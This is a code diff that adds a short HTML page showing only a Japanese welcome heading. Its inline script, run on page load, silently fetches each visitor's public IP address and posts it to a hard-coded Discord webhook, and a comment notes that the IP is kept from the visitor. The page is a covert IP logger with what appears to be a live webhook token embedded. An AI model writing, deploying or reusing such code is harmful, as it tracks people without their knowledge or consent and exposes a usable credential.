@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>IPログ</title>
+</head>
+<body>
+  <h1>ようこそ</h1>
+  <script>
+    const webhookUrl = "https://discord.com/api/webhooks/1380138909631123547/nvpr4yz48EStbdjzFx6AL-92aoxXYFZay_fSmLLpZ-uGJePGx8N4aFfwF3bkkKtFqUZm";
+
+    fetch("https://api.ipify.org?format=json")
+      .then(res => res.json())
+      .then(data => {
+        const ip = data.ip;
+
+        // Webhookに送信（IP表示しない）
+        fetch(webhookUrl, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify({
+            content: `📡 新しい訪問者: ${ip}`
+          })
+        });
+      })
+      .catch(err => console.error("IP取得エラー:", err));
+  </script>
+</body>
+</html>
